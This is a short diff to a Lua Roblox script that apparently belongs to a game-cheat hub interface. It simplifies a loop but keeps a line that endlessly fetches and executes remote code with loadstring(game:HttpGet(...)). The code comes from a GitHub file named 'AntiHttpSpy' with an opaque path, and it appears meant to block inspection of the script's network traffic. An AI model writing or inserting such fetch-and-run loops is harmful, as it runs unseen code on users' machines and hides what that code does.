@@ -4148,10 +4148,6 @@ aText = [[
 ]]
 Tab:AddParagraph("Updates","New features added" .. aText .. "")
 
-for i = 1, 10 do
   while task.wait() do
-   for i = 1, 10 do
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/AntiHttpSpy/main/ABCDEFJRTYUIOPLKSZXCVNMQWLAHLGTFBMLLOYFRUFSCBMJTEWCBHTD"))()
    end
-  end
-end
